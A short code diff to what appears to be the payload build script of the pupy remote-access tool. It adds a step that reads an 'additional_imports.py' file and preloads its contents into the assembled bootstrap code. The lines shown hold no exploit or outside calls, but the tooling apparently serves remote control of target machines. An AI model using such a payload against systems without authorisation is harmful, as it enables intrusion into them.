@@ -57,6 +57,12 @@ if __name__=="__main__":
     with open(os.path.join('..','..','pupy','pp.py')) as f:
         pp = f.read()
 
+    # We are interested to consume embedded modules
+    # This will help to preload some
+    preload = None
+    with open(os.path.join('..','additional_imports.py')) as f:
+        preload = f.read()
+
     pupyimporter = marshal.dumps(
         compile(pupyimporter, '<string>', 'exec')
     )
@@ -72,6 +78,7 @@ if __name__=="__main__":
         pupyload.format('pupyimporter', repr(pupyimporter)),
         'import pupyimporter\n'
         'pupyimporter.install({})\n'.format(args.debug),
+        preload+'\n',
         pp+'\n',
     ]
 
